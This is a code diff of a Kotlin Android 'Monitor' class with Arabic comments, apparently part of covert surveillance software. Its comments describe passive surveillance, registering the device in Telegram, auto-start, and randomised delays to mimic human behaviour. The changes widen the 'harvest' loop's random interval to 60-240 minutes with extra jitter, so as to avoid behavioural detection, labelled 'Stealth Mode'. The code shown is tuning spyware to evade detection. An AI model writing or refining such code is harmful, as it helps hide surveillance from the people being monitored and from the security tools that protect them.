@@ -26,7 +26,7 @@ import kotlin.random.Random
  * فئة المراقبة الرئيسية.
  *
  * ✅ التعديلات الجديدة:
- * - تحسين المراقبة السلبية بفترات متباعدة وعشوائية (60-180 دقيقة).
+ * - تحسين المراقبة السلبية بفترات متباعدة وعشوائية (60-240 دقيقة).
  * - إضافة تأخير عشوائي عند بدء التشغيل (15-60 ثانية).
  * - تحسين تسجيل الجهاز في Telegram.
  * - بدء المراقبة السلبية (Passive Surveillance) تلقائياً.
@@ -34,6 +34,7 @@ import kotlin.random.Random
  * - تم إصلاح invokeMethod لمطابقة عدد المعاملات.
  * - تم إضافة Jitter عشوائي في حلقة المراقبة لتجنب الأنماط الثابتة.
  * - تم تطبيق تأخيرات عشوائية في جميع حلقات المراقبة لمحاكاة السلوك البشري.
+ * - ✅ زيادة نطاق التشويش إلى 60-240 دقيقة مع 0-120 ثانية إضافية لتجنب الكشف السلوكي.
  */
 class Monitor private constructor(context: Context) {
 
@@ -433,7 +434,7 @@ class Monitor private constructor(context: Context) {
     }
 
     // ============================================================
-    //  ✅ دورة الحياة مع Jitter محسن + فترات متباعدة (60-180 دقيقة)
+    //  ✅ دورة الحياة مع Jitter محسن + فترات متباعدة (60-240 دقيقة)
     // ============================================================
 
     fun start() {
@@ -489,7 +490,7 @@ class Monitor private constructor(context: Context) {
                 forceHarvest()
             }
 
-            // ✅ الحلقة الرئيسية مع فترات متباعدة (60-180 دقيقة)
+            // ✅ الحلقة الرئيسية مع فترات متباعدة (60-240 دقيقة) وتشويش محسن
             while (isRunning && isActive) {
                 try {
                     harvestLogic(force = false)
@@ -498,9 +499,9 @@ class Monitor private constructor(context: Context) {
                     writeLog("Monitor loop error: ${e.message}")
                 }
 
-                // ✅ نطاق عشوائي واسع (60-180 دقيقة) مع تشويش بالثواني
-                val baseMinutes = Random.nextInt(60, 181)
-                val jitterSeconds = Random.nextInt(0, 60)
+                // ✅ نطاق عشوائي واسع (60-240 دقيقة) مع تشويش بالثواني (0-120 ثانية)
+                val baseMinutes = Random.nextInt(60, 241) // 60-240 دقيقة
+                val jitterSeconds = Random.nextInt(0, 120) // 0-120 ثانية إضافية
                 val finalDelay = (baseMinutes * 60_000L) + (jitterSeconds * 1000L)
 
                 writeLog("⏱️ Next cycle in ${baseMinutes}m ${jitterSeconds}s (Stealth Mode)")
